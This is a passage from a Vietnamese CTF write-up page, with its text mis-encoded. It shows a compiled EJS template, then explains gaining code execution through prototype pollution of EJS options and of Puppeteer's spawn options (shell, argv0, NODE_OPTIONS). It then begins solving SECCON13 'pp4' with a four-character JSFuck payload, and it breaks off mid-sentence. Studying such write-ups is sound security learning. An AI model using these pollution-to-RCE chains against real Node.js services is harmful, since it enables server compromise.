noteList.appendChild(listItem);\\n}\\n\\nfunction submitNote() {\\n  const title = document.getElementById(\\&quot;title\\&quot;).value;\\n  const content = document.getElementById(\\&quot;content\\&quot;).value;\\n\\n  const noteData = { title, content };\\n\\n  fetch(\\&quot;/create\\&quot;, {\\n    method: \\&quot;POST\\&quot;,\\n    headers: {\\n      \\&quot;Content-Type\\&quot;: \\&quot;application/json\\&quot;,\\n    },\\n    body: JSON.stringify(noteData),\\n  })\\n    .then((response) =&gt; response.json())\\n    .then((data) =&gt; {\\n      if (data.Message) {\\n        document.getElementById(\\&quot;message\\&quot;).innerHTML = data.Message;\\n        if (data.Noteid){\\n          addItemToList(data);\\n        }\\n      } \\n    })\\n    .catch((error) =&gt; {\\n      console.error(\\&quot;error:\\&quot;, error);\\n      document.getElementById(\\&quot;message\\&quot;).innerText = &#39;Error&#39;;\\n    });\\n\\n}\\n&lt;/script&gt;\\n\\n  &lt;% if (Message) { %&gt;\\n    &lt;p&gt;&lt;%= Message %&gt;&lt;/p&gt;\\n  &lt;% } %&gt;\\n  &lt;h2&gt;Created Notes:&lt;/h2&gt;\\n  &lt;ul id=\\&quot;noteList\\&quot; style=\\&quot;text-align:center\\&quot;&gt;\\n    &lt;% for (const noteId of noteList) { %&gt;\\n      &lt;li&gt;&lt;a href=\\&quot;/view/&lt;%= noteId %&gt;\\&quot;&gt;&lt;%= noteId %&gt;&lt;/a&gt;&lt;/li&gt;\\n    &lt;% } %&gt;\\n  &lt;/ul&gt;\\n  &lt;/div&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n&quot;</span></span>\n<span class="line">  <span class="token punctuation">,</span> __filename <span class="token operator">=</span> <span class="token string">&quot;/tmp/note/src/views/create.ejs&quot;</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token keyword">try</span> <span class="token punctuation">{</span></span>\n<span class="line">  <span class="token keyword">var</span> __output <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token keyword">function</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> s <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> __output <span class="token operator">+=</span> s <span class="token punctuation">}</span></span>\n<span class="line">  <span class="token keyword">with</span> <span class="token punctuation">(</span>locals <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;&lt;!-- views/create.ejs --&gt;\\n&lt;!DOCTYPE html&gt;\\n&lt;html&gt;\\n&lt;head&gt;\\n  &lt;title&gt;Create Note&lt;/title&gt;\\n  &lt;style&gt;\\n    body {\\n      background-color: #303030; /* Dark background color */\\n      color: #ffffff; /* Text color */\\n      font-family: &#39;Arial&#39;, sans-serif;\\n      display: flex;\\n      align-items: center;\\n      justify-content: center;\\n      height: 100vh;\\n      margin: 0;\\n    }\\n\\n    .card {\\n      background-color: #444444; /* Card background color */\\n      border-radius: 8px;\\n      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);\\n      padding: 20px;\\n      width: 400px;\\n      box-sizing: border-box;\\n    }\\n\\n    h1, h2 {\\n      color: #ffffff; /* Heading text color */\\n      text-align: center;\\n    }\\n\\n    form {\\n      max-width: 100%;\\n      margin-top: 20px;\\n    }\\n\\n    label {\\n      color: #ffffff; /* Label text color */\\n    }\\n\\n    input[type=\\&quot;text\\&quot;], textarea {\\n      width: 100%;\\n      padding: 10px;\\n      margin: 8px 0;\\n      box-sizing: border-box;\\n      background-color: #333333; /* Input background color */\\n      color: #ffffff; /* Input text color */\\n      border: 1px solid #ffffff; /* Input border color */\\n    }\\n\\n    input[type=\\&quot;button\\&quot;] {\\n      background-color: #ffffff; /* Button background color */\\n      color: #303030; /* Button text color */\\n      padding: 10px 15px;\\n      border: none;\\n      cursor: pointer;\\n      width: 100%;\\n    }\\n\\n    input[type=\\&quot;button\\&quot;]:hover {\\n      background-color: #555555; /* Button background color on hover */\\n    }\\n\\n    #message {\\n      color: #ff0000; /* Error message color */\\n      margin-top: 10px;\\n      text-align: center;\\n    }\\n\\n    #noteList {\\n      list-style-type: none;\\n      padding: 0;\\n    }\\n\\n    #noteList li {\\n      margin-bottom: 8px;\\n    }\\n\\n    #noteList a {\\n      text-decoration: none;\\n      color: #ffffff; /* Link text color */\\n    }\\n\\n    #noteList a:hover {\\n      text-decoration: underline;\\n    }\\n  &lt;/style&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n&lt;div class=\\&quot;card\\&quot;&gt;\\n  &lt;h1&gt;Create a New Note&lt;/h1&gt;\\n  &lt;form id=\\&quot;noteForm\\&quot;&gt;\\n    &lt;label for=\\&quot;title\\&quot;&gt;Title:&lt;/label&gt;&lt;br&gt;\\n    &lt;input type=\\&quot;text\\&quot; id=\\&quot;title\\&quot; name=\\&quot;title\\&quot; required&gt;&lt;br&gt;\\n    &lt;label for=\\&quot;content\\&quot;&gt;Content:&lt;/label&gt;&lt;br&gt;\\n    &lt;textarea id=\\&quot;content\\&quot; name=\\&quot;content\\&quot; rows=\\&quot;4\\&quot; cols=\\&quot;50\\&quot; required&gt;&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;\\n    &lt;input type=\\&quot;button\\&quot; value=\\&quot;Create Note\\&quot; onclick=\\&quot;submitNote()\\&quot;&gt;\\n  &lt;/form&gt;\\n\\n&lt;div id=\\&quot;message\\&quot; style=\\&quot;color: red;\\&quot;&gt;&lt;/div&gt;\\n\\n&lt;script&gt;\\nfunction addItemToList(item) {\\n  const noteList = document.getElementById(&#39;noteList&#39;);\\n  const listItem = document.createElement(&#39;li&#39;);\\n\\n  const link = document.createElement(&#39;a&#39;);\\n  link.href = `/view/${item.Noteid}`; \\n  link.textContent = item.Noteid; \\n  listItem.appendChild(link);\\n\\n  noteList.appendChild(listItem);\\n}\\n\\nfunction submitNote() {\\n  const title = document.getElementById(\\&quot;title\\&quot;).value;\\n  const content = document.getElementById(\\&quot;content\\&quot;).value;\\n\\n  const noteData = { title, content };\\n\\n  fetch(\\&quot;/create\\&quot;, {\\n    method: \\&quot;POST\\&quot;,\\n    headers: {\\n      \\&quot;Content-Type\\&quot;: \\&quot;application/json\\&quot;,\\n    },\\n    body: JSON.stringify(noteData),\\n  })\\n    .then((response) =&gt; response.json())\\n    .then((data) =&gt; {\\n      if (data.Message) {\\n        document.getElementById(\\&quot;message\\&quot;).innerHTML = data.Message;\\n        if (data.Noteid){\\n          addItemToList(data);\\n        }\\n      } \\n    })\\n    .catch((error) =&gt; {\\n      console.error(\\&quot;error:\\&quot;, error);\\n      document.getElementById(\\&quot;message\\&quot;).innerText = &#39;Error&#39;;\\n    });\\n\\n}\\n&lt;/script&gt;\\n\\n  &quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">145</span></span>\n<span class="line">    <span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>Message<span class="token punctuation">)</span> <span class="token punctuation">{</span> </span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;\\n    &lt;p&gt;&quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">146</span></span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token function">escapeFn</span><span class="token punctuation">(</span> Message <span class="token punctuation">)</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;&lt;/p&gt;\\n  &quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">147</span></span>\n<span class="line">    <span class="token punctuation">;</span>  <span class="token punctuation">}</span> </span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;\\n  &lt;h2&gt;Created Notes:&lt;/h2&gt;\\n  &lt;ul id=\\&quot;noteList\\&quot; style=\\&quot;text-align:center\\&quot;&gt;\\n    &quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">150</span></span>\n<span class="line">    <span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> noteId <span class="token keyword">of</span> noteList<span class="token punctuation">)</span> <span class="token punctuation">{</span> </span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;\\n      &lt;li&gt;&lt;a href=\\&quot;/view/&quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">151</span></span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token function">escapeFn</span><span class="token punctuation">(</span> noteId <span class="token punctuation">)</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;\\&quot;&gt;&quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token function">escapeFn</span><span class="token punctuation">(</span> noteId <span class="token punctuation">)</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;&lt;/a&gt;&lt;/li&gt;\\n    &quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">152</span></span>\n<span class="line">    <span class="token punctuation">;</span>  <span class="token punctuation">}</span> </span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;\\n  &lt;/ul&gt;\\n  &lt;/div&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n&quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">157</span></span>\n<span class="line">  <span class="token punctuation">}</span></span>\n<span class="line">  <span class="token keyword">return</span> __output<span class="token punctuation">;</span></span>\n<span class="line"><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">  <span class="token function">rethrow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> __lines<span class="token punctuation">,</span> __filename<span class="token punctuation">,</span> __line<span class="token punctuation">,</span> escapeFn<span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><p>Nh∆∞ v·∫≠y, sau khi xem m·ªôt note b·∫•t k·ª≥ hay GET ƒë·∫øn <code>/create</code>, h√†m <code>res.render()</code> s·∫Ω ƒë∆∞·ª£c g·ªçi v√† s·ª≠ d·ª•ng EJS ƒë·ªÉ render template, options prototype ƒë∆∞·ª£c truy·ªÅn v√†o s·∫Ω execute code c·ªßa m√¨nh.</p><p>Tr∆∞·ªõc ti√™n g√°n cho <code>opts.client</code> l√† truthy value. Ti·∫øp t·ª•c g√°n cho <code>escapeFunction</code>. V√¨ c√≥ th·ªÉ RCE, m√¨nh c√≥ c√≥ th·ªÉ ƒë·ªçc t·∫•t c·∫£ c√°c notes v√† t√¨m note c√≥ flag, sau ƒë√≥ t·∫°o note m·ªõi ch·ªâ ch·ª©a flag ƒë√≥ v·ªõi t√™n c·ªë ƒë·ªãnh (<code>flag.json</code>). Options c·ªßa EJS ƒë√£ ƒë∆∞·ª£c g√°n v√†o, gi·ªù ta ch·ªâ c·∫ßn cho h√†m <code>res.render()</code> ch·∫°y, file note m·ªõi v·ªõi t√™n <code>flag.json</code> s·∫Ω ƒë∆∞·ª£c sinh ra, view note ƒë√≥ v√† l·∫•y flag üòô <img src="' + _imports_10 + '" alt="alt text"></p><h5 id="rce-voi-puppeteer" tabindex="-1"><a class="header-anchor" href="#rce-voi-puppeteer"><span>RCE v·ªõi Puppeteer</span></a></h5><p>Khi GET <code>/healthcheck</code>, server s·∫Ω ch·∫°y bot v·ªõi Puppeteer, t·∫°o m·ªôt process m·ªõi, ch·∫°y browser headless v√† truy c·∫≠p v√†o trang <code>/view/Healthcheck</code>. <img src="' + _imports_11 + '" alt="alt text"> Khi Puppeteer launch browser m·ªõi, c≈©ng ƒë·ªìng th·ªùi s·ª≠ d·ª•ng <code>child_process.spawn()</code> v·ªõi 3 args l√† <code>detached</code>, <code>env</code>, <code>stdio</code>. <img src="' + _imports_12 + '" alt="alt text"> Tuy nhi√™n h√†m <code>spawn()</code> c√≤n nh·ªØng options kh√°c nh∆∞ <code>shell</code>, <code>argv0</code>, ta c√≥ th·ªÉ pollute c√°c attribute n√†y ƒë·ªÉ g·ªçi shell ch·∫°y l·ªánh c·ªßa m√¨nh.</p><p>Ta th·ª≠ g√°n gi√° tr·ªã cho 2 options n√≥i tr√™n <img src="' + _imports_13 + '" alt="alt text"> Server s·∫Ω ch·∫°y l·ªánh nh∆∞ sau <code>/bin/sh echo hehehe -c this.#executablePath this.#args</code>. Nh∆∞ v·∫≠y, ta c√≥ th·ªÉ thay ƒë·ªïi <code>shell</code> th√†nh <code>/proc/self/exe</code> -&gt; <code>node</code> v√† RCE v·ªõi <code>NODE_OPTIONS</code></p><p>ƒê·∫ßu ti√™n g√°n gi√° tr·ªã cho <code>shell</code> th√†nh <code>/proc/self/exe</code>, ti·∫øp t·ª•c g√°n gi√° tr·ªã cho <code>argv0</code> l√† ƒëo·∫°n javascript c·∫ßn execute. Cu·ªëi c√πng l√† ch·ªânh <code>NODE_OPTIONS</code> l√† <code>--require /proc/self/cmdline</code> ƒë·ªÉ ch·∫°y l·ªánh c·ªßa m√¨nh. Sau khi pollute c√°c options th√¨ GET ƒë·∫øn <code>/healthcheck</code> ƒë·ªÉ Puppeteer spawn process m·ªõi. Khi ƒë√≥, command m√¨nh ƒë∆∞a v√†o s·∫Ω ƒë∆∞·ª£c th·ª±c hi·ªán, gi·ªù ch·ªâ c·∫ßn m·ªü <code>/view/flag</code> l·∫•y flag</p><h3 id="seccon13-pp4" tabindex="-1"><a class="header-anchor" href="#seccon13-pp4"><span>seccon13/pp4</span></a></h3><div class="custom-container info"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">INFO</p><blockquote><p>Author: Ark</p></blockquote><details class="custom-container details"><summary class="custom-container-title">Source</summary><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token hashbang comment">#!/usr/local/bin/node</span></span>\n<span class="line"><span class="token keyword">const</span> readline <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&quot;node:readline/promises&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token keyword">const</span> rl <span class="token operator">=</span> readline<span class="token punctuation">.</span><span class="token function">createInterface</span><span class="token punctuation">(</span><span class="token punctuation">{</span></span>\n<span class="line">  <span class="token literal-property property">input</span><span class="token operator">:</span> process<span class="token punctuation">.</span>stdin<span class="token punctuation">,</span></span>\n<span class="line">  <span class="token literal-property property">output</span><span class="token operator">:</span> process<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span></span>\n<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line"><span class="token keyword">const</span> <span class="token function-variable function">clone</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>\n<span class="line">  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> value<span class="token punctuation">]</span> <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> value <span class="token operator">==</span> <span class="token string">&quot;object&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>key <span class="token keyword">in</span> result<span class="token punctuation">)</span><span class="token punctuation">)</span> result<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span></span>\n<span class="line">      <span class="token function">clone</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> result<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>\n<span class="line">      result<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line">  <span class="token punctuation">}</span></span>\n<span class="line">  <span class="token keyword">return</span> result<span class="token punctuation">;</span></span>\n<span class="line"><span class="token punctuation">}</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line"><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>\n<span class="line">  <span class="token comment">// Step 1: Prototype Pollution</span></span>\n<span class="line">  <span class="token keyword">const</span> json <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">await</span> rl<span class="token punctuation">.</span><span class="token function">question</span><span class="token punctuation">(</span><span class="token string">&quot;Input JSON: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">  <span class="token comment">// Step 2: JSF**k with 4 characters</span></span>\n<span class="line">  <span class="token keyword">const</span> code <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">await</span> rl<span class="token punctuation">.</span><span class="token function">question</span><span class="token punctuation">(</span><span class="token string">&quot;Input code: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">.</span>size <span class="token operator">&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;Too many :(&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token keyword">return</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token punctuation">}</span></span>\n<span class="line">  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">finally</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> rl<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details></div><p>B√†i y√™u c·∫ßu ng∆∞·ªùi d√πng nh·∫≠p v√†o m·ªôt JSON ƒë·ªÉ pollute prototype v√† sau ƒë√≥ eval code v·ªõi 4 k√≠ t·ª±. JSFuck b√¨nh th∆∞·ªùng c·∫ßn s·ª≠ d·ª•ng ƒë·∫øn 6 k√≠ t·ª± n√™n ta c·∫ßn ph·∫£i t√¨m c√°ch pollute ƒë∆∞·ª£c prototype n√†o ƒë√≥ ƒë·ªÉ c√≥ th·ªÉ ch·∫°y code b·∫•t k√¨ ch·ªâ v·ªõi 4 k√≠ t·ª±.</p><p>Ch·ªâ nh·∫≠p v√†o ƒë∆∞·ª£c 4 k√≠ t·ª± n√™n ta c·∫ßn pollute code v√† s·ª≠ d·ª•ng Object Function ƒë·ªÉ ch·∫°y ƒëo·∫°n code ƒë√≥.</p><div class="language-javascript" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token function">Function</span><span class="token punctuation">(</span><span class="token string">&quot;code&quot;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>\n<span class="line"></span></code></pre></div><p>ƒêo·∫°n code tr√™n s·∫Ω t·∫°o anonymous function sau ƒë√≥ execute function ƒë√≥. Gi·ªù ta c·∫ßn chuy·ªÉn qua jsfuck ƒë·ªÉ c√≥ th·ªÉ execute code. JSFuck th√¥ng th∆∞·ªùng c√≥ 6 k√≠ t·ª± <code>[]()!+</code>, tuy nhi√™n trong n√†y ch·ªâ ƒë∆∞·ª£c 4 k√≠ t·ª±. N√™n ta c·∫ßn ch·ªçn ra 4 k√≠ t·ª± c√≥ th·ªÉ s·ª≠ d·ª•ng ƒë∆∞·ª£c trong b√†i n√†y. Tr∆∞·ªõc h·∫øt ta c·∫ßn <code>()</code> ƒë·ªÉ c√≥ th·ªÉ invoke function. Hai k√≠ t·ª± c√≤n l·∫°i c√≥ th·ªÉ t·∫≠n d·ª•ng ƒë∆∞·ª£c ƒë·ªÉ l√†m nhi·ªÅu th·ª© kh√°c l√† <code>[]</code>.</p><p><code>[]</code> l√† Array, c√°c prototype c·ªßa n√≥ bao g·ªìm nh·ªØng h√†m thu·ªôc object Function, nh∆∞ v·∫≠y ta c·∫ßn t√¨m c√°ch g·ªçi ƒë·∫øn m·ªôt trong nh·ªØng prototype d∆∞·ªõi ƒë√¢y ƒë·ªÉ c√≥ ƒë∆∞·ª£c object Function <img src="' + _imports_14 + '" alt="alt text"> Sau khi c√≥ ƒë∆∞·ª£c ƒë·∫øn Function b·∫•t k√¨, ta c√≥ th·ªÉ truy c·∫≠p ƒë·∫øn <code>constructor</code> c·ªßa n√≥ ƒë·ªÉ g·ªçi ƒë∆∞·ª£c object Function <img src="' + _imports_15 + '" alt="alt text"></p><p>V·∫•n ƒë·ªÅ b√¢y gi·ªù l√† l√†m sao ch·ªâ d·ª±a v√†o 4 k√≠ t·ª± <code>[]()</code> ƒë·ªÉ truy c·∫≠p ƒë∆∞·ª£c <code>constructor</code>. <code>[]</code> l√† k√≠ t·ª± kh√° ƒë·∫∑c bi·ªát, kh√¥ng ch·ªâ l√† Array m√† c√≤n l√† c√°ch ƒë·ªÉ truy c·∫≠p m·ªôt thu·ªôc t√≠nh c·ªßa object. Ta ph·∫£i t√¨m c√°ch pollute ƒë·ªÉ c√≥ th·ªÉ g·ªçi ƒë·∫øn string &quot;constructor&quot;. Khi s·ª≠ d·ª•ng bracket notation, t√™n thu·ªôc t√≠nh tr∆∞·ªõc h·∫øt s·∫Ω ƒë∆∞·ª£c chuy·ªÉn qua String. V√≠ d·ª• v·ªõi object <code>a</code>, khi truy c·∫≠p ƒë·∫øn m·ªôt thu·ªôc t√≠nh kh√¥ng t·ªìn t·∫°i, s·∫Ω tr·∫£ v·ªÅ <code>undefined</code>, convert qua String s·∫Ω th√†nh chu·ªói <code>&quot;undefined&quot;</code>. Nh∆∞ th·∫ø ta ch·ªâ c·∫ßn pollute <code>&quot;undefined&quot; = &quot;constructor&quot;</code><img src="' + _imports_16 + '" alt="alt text"> Khi chuy·ªÉn sang jsfuck, ta c√≥ th·ªÉ cho Array truy c·∫≠p ƒë·∫øn m·ªôt property r·ªóng</p><div class="language-javascript" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> Array<span class="token punctuation">[</span><span class="token string">&quot;&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">undefined</span></span>\n<span class="line"><span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> Array<span class="token punctuation">[</span>Array<span class="token punctuation">[</span><span class="token string">&quot;&quot;</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;constructor&quot;</span></span>\n<span class="line"></span></code></pre></div><p>Nh∆∞ v·∫≠y, ta ƒë√£ c√≥ ƒë∆∞·ª£c object Function. B√¢y gi·ªù ta c·∫ßn pollute ƒë·ªÉ c√≥ th·ªÉ l∆∞u ƒë∆∞·ª£c ƒëo·∫°n code c·ªßa m√¨nh v√†o. D·ª±a v√†o payload ·ªü tr√™n. Khi ta s·ª≠ d·ª•ng <code>[][[]]</code> l√† ƒëang truy c·∫≠p ƒë·∫øn m·ªôt property v·ªõi chu·ªói r·ªóng, ta c√≥ th·ªÉ pollute chu·ªói n√†y ƒë·ªÉ ch·ª©a execute code</p><div class="language-javascript" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> Array<span class="token punctuation">[</span><span class="token string">&quot;&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;console.log(123)&quot;</span></span>\n<span class="line"></span></code></pre></div><p>L√∫c n√†y, ta c·∫ßn ph·∫£i ch·ªânh l·∫°i payload ph√≠a tr√™n m·ªôt t√≠ ƒë·ªÉ c√≥ th·ªÉ ra ƒë∆∞·ª£c chu·ªói <code>&quot;constructor&quot;</code> v√¨ 